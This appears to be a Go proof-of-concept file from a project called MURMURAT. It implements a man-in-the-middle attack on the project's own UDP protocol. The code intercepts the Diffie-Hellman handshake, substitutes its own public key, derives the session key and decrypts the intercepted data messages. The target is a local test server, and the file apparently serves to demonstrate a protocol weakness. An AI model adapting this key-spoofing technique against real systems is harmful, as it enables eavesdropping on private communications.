package poc

import (
	"MURMURAT/handler"
	"MURMURAT/poc/mitm"
	"MURMURAT/protocol"
	"MURMURAT/protocol/message"
	"bytes"
	"fmt"
	"net"
)

func DhSpoof() {
	serverAddr := &net.UDPAddr{
		IP:   net.IPv4(127, 0, 0, 1),
		Port: 1234,
	}

	dh := protocol.NewDiffieHellman()
	var encryptionHandler *handler.EncryptionHandler

	client := mitm.NewClient(serverAddr, 0, func(session *mitm.Session) error {
		return session.SendDataMessage([]byte("Hello from client"))
	})
	client.RegisterSnooper(func(udp *mitm.UDP, buf []byte, addr net.Addr, incoming bool) bool {
		buffer := bytes.NewBuffer(buf)
		reader := protocol.NewReader(buffer)

		header := &message.Header{}
		if err := header.Marshal(reader); err != nil {
			fmt.Errorf("read message header: %w", err)
			return true
		}

		if header.ID == message.IDDH {
			if incoming {
				msg := &message.DHMessage{}
				if err := msg.Marshal(reader); err != nil {
					fmt.Errorf("read message data: %w", err)
					return true
				}

				err := dh.ComputeSharedKey(msg.PublicKey)
				if err != nil {
					fmt.Errorf("failed to compute shared key: %w", err)
					return true
				}

				encryptionHandler = handler.NewEncryptionHandler(dh.SessionKey)
			} else {
				msg := &message.DHMessage{
					PublicKey: dh.PublicKey.Bytes(),
				}

				_, err := udp.WritePacket(msg, addr, true)
				if err != nil {
					fmt.Errorf("write message data: %w", err)
				}
				return false
			}
		}

		if header.ID == message.IDData && incoming {
			msg := &message.DataMessage{}
			if err := msg.Marshal(reader); err != nil {
				fmt.Errorf("read message data: %w", err)
				return true
			}

			decrypt, err := encryptionHandler.Decrypt(msg.Data, msg.Nonce)
			if err != nil {
				fmt.Errorf("failed to decrypt message: %w", err)
				return true
			}

			fmt.Printf("Decrypted message from MITM: %s\n", decrypt)
		}

		return true
	})
	server := mitm.NewServer(serverAddr.Port)
	server.SetOnSessionInitialized(func(session *mitm.Session) {
		session.SendDataMessage([]byte("Hello from server"))
	})

	go server.Start()
	client.Start()
}
